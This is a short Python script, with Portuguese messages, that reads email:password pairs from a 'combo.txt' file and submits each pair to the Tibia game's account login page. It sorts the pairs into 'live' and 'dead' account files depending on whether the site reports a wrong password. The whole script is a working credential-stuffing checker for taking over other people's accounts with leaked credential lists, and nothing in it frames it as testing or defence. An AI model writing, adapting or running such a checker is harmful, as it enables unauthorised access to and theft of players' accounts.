import requests

req = requests.session()
url = 'https://www.tibia.com/account/?subtopic=accountmanagement'
a = open('combo.txt', 'r')
stop = 'default'
file = [s.rstrip() for s in a.readlines()]
for lines in file:
    combo = lines.split(':')
    param = {
        'loginemail': combo[0],
        'loginpassword': combo[1],
        'page': 'overview'
    }
    try:
        source = req.post(url, data=param)

        if('You have entered a wrong password or email address.' in source.text):
            print('Email ou senha errados: {}:{}'.format(combo[0], combo[1]))
            print('--> Dead accounts <--\n' + combo[0] + '|' + combo[1], file=open('tibiaDeadACC.txt', 'a+'))

        else:
            print('Conta Funcionando: {}:{}'.format(combo[0], combo[1]))
            print('--> Live accounts <--\n' + combo[0] + '|' + combo[1], file=open('tibiaLiveACC.txt', 'a+'))

    except:
        break
    if(stop in combo[0]):
        break